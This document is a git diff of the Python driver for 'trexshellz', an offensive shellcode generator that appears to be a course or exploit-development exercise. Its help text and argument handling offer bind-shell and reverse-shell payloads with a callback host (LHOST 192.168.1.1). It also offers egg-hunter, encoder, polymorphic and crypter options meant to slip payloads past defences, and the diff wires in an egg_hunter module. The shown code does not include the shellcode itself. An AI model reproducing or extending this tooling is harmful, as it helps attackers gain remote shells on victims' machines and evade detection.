@@ -11,22 +11,23 @@ import argparse
 
 parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter,
     description='Description: Pass args for shellcode generation', 
-    usage='./trexshellz.py <payload> [<args>]' + "\n"
+    usage='./trexshellz.py <options> <payload> <payload args>' + "\n"
         'Current payloads are:' + "\n"
         '    bind_shell' + "\n"
         '    reverse_shell' + "\n"
         '    execve_stack' + "\n"
         '    custom' + "\n",
     epilog=
-        '-Bind shell: ./trexshellz.py bind_shell --LPORT 4545' + "\n"
-        '-Reverse shell: ./trexshellz.py reverse_shell --LHOST 192.168.1.1 --LPORT 4545' + "\n"
+        '-Bind shell: ./trexshellz.py bind_shell --LPORT 4321' + "\n"
+        '-Reverse shell: ./trexshellz.py reverse_shell --LHOST 192.168.1.1 --LPORT 4321' + "\n"
         '-Execve-stack: ./trexshellz.py execve_stack' + "\n"
         '-Custom: ./trexshellz.py custom --SHELLCODE <shellcode>' + "\n"
-        '-EggHunter: ./trexshellz.py bind_shell --LPORT 4545 --EGG' + "\n"
-        '-Encode: ./trexshellz.py bind_shell --LPORT 4545 --ENCODE' + "\n"
-        '-Analyze: ./trexshellz.py custom --SHELLCODE <shellcode> --ANALYZE' + "\n"
-        '-Polymorph: ./trexshellz.py bind_shell --LPORT 4545 --POLYMORPH' + "\n"
-        '-Crypter: ./trexshellz.py bind_shell --LPORT --CRYPT' + "\n")  
+        '-EggHunter: ./trexshellz.py --EGG bind_shell --LPORT 4321' + "\n"
+        '-Encode: ./trexshellz.py --ENCODE bind_shell --LPORT 4321' + "\n"
+        '-Analyze: ./trexshellz.py custom --ANALYZE --SHELLCODE <shellcode>' + "\n"
+        '-Polymorph: ./trexshellz.py --POLYMORPH bind_shell --LPORT 4321' + "\n"
+        '-Crypter: ./trexshellz.py --CRYPT bind_shell --LPORT' + "\n")  
+
 
 ### payload parsers ###
 subparsers = parser.add_subparsers(dest='payload')
@@ -47,9 +48,10 @@ parser_custom = subparsers.add_parser('custom')
 parser_custom.add_argument("--SHELLCODE", required=True, metavar='<shellcode>', 
     help="specify shellcode")
 
+
 ### option parsers ###
 parser.add_argument("--EGG", action='store_true', 
-    help="specify egg hunter technique, string is \"eggy\"")
+    help="specify egg hunter technique, egg is hex \"x90x50x90x50\"")
 parser.add_argument("--ENCODE", action='store_true', 
     help="specify the built-in encoding technique")
 parser.add_argument("--ANALYZE", action='store_true', help="analyze a given shellcode")
@@ -61,30 +63,40 @@ args = parser.parse_args()
 
 #print args    # prints namespace and all values of args
 
-if args.EGG is not False:
-    print "EGG has been set (value is %s)" % args.EGG
-
-
 if args.payload == 'bind_shell':
     #print '%s payload selected w/ %i as port' % (args.payload,args.LPORT)
     args_port = args.LPORT
+    args_host = False
+    args_egg = args.EGG
     if args.LPORT <= 256:
         print "Please specify port greater than 256!"
     else:
         sys.path.insert(0,"Modules/BindShell/")
         import bind_shell
+        if args.EGG is not False:
+            print "EGG has been set"
+            print "copy the \"egghunter\" and \"payload\" values to the egghunter_template.c file and compile"
+            sys.path.insert(0,"Modules/EggHunter/")
+            import egg_hunter
 
 elif args.payload == 'reverse_shell':
     #print '%s payload selected w/ %s as host and %i as port' % (args.payload,args.LHOST,args.LPORT)
     args_host = args.LHOST
     args_port = args.LPORT
+    args_egg = args.EGG
     if args.LPORT <= 256:
         print "Please specify port greater than 256!"
     #elif args.LHOST need to implement a check for IPs containing .0. 
     else:
         sys.path.insert(0,"Modules/ReverseShell/")
         import reverse_shell
-     
+        if args.EGG is not False:
+            print "EGG has been set"
+            print "copy the \"egghunter\" and \"payload\" values to the egghunter_template.c file and compile"
+            sys.path.insert(0,"Modules/EggHunter/")
+            import egg_hunter
+
+
 elif args.payload == 'execve_stack':
     import execve_stack
 
